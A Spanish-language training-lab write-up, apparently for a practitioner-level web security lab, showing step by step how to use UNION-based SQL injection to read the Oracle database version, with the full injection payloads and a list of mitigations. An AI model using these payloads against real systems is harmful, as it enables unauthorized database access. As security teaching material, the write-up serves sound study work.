Lab 3

SQL Injection attack querying database type and version on Oracle

Información del laboratorio

Nivel: Practitioner

Tipo de SQLi: UNION-based SQL Injection

Objetivo

Explotar una vulnerabilidad SQL Injection basada en UNION para obtener y mostrar la versión de la base de datos Oracle.

Vulnerabilidad

La aplicación construye una consulta SQL concatenando directamente el parámetro category sin validación adecuada. 

SELECT name, description 
FROM products 
WHERE category = 'Accessories'

El atacante puede modificarla a:

SELECT name, description FROM products
WHERE category = ''
UNION SELECT banner, NULL FROM v$version--

Procedimiento

Paso 1: Interceptar la petición con Burp Suite.

Abrimos el laboratorio en el navegador de Burp (Chromium) y navegamos dentro del sitio para generar tráfico HTTP.

Seleccionamos una categoría de productos como Gifts. Esto genera la petición vulnerable: 

GET /filter?category=Gifts

Paso 2: Confirmar SQL Injection.

Enviamos la petición al Repeater y modificamos el parámetro: 

Gifts'

El servidor devuelve un error SQL, lo cual confirma la vulnerabilidad.

Paso 3: Encontrar número de columnas.

'+UNION+SELECT+NULL,NULL+FROM+dual--

El servidor responde correctamente, indicando que la consulta tiene 2 columnas.

Paso 4: Verificar columnas de texto.

'+UNION+SELECT+'abc','def'+FROM+dual--

La respuesta muestra "abc" y "def", confirmando que ambas columnas aceptan texto.

Paso 5: Extraer versión de Oracle.

'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

Esto devuelve información como: 

Oracle Database 11g Express Edition Release 11.2.0.2.0
CORE 11.2.0.2.0 Production
PL/SQL Release 11.2.0.2.0

Mitigación recomendada

  • Uso de consultas parametrizadas.
  • Validación estricta de entrada.
  • No mostrar errores SQL al usuario.
  • Aplicar principio de mínimo privilegio.
  • Implementar WAF como capa adicional.

Impacto: Exposición de información sensible del DBMS.
